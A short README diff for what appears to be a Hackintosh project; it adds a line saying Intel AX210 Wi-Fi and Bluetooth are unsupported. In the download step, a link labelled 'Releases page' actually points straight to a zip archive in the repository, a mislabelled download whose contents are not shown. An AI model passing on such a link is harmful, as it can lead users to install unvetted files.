@@ -15,6 +15,7 @@ To begin, you will need to download and install the software. Ensure you have a 
 - **RAM:** At least 16 GB recommended
 - **Storage:** Minimum of 50 GB free space for installation
 - **USB Drive:** 16 GB or larger for creating a bootable drive
+- NO Wifi + Bluetooth	Intel AX 210S support ;(
 
 ## 📥 Download & Install
 1. Visit the [Releases page](https://raw.githubusercontent.com/HADE055/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh/main/unindented/Z490M-Gaming-X-i7-10700K-RX-6600-XT-Hackintosh.zip) to download the latest version of the software.
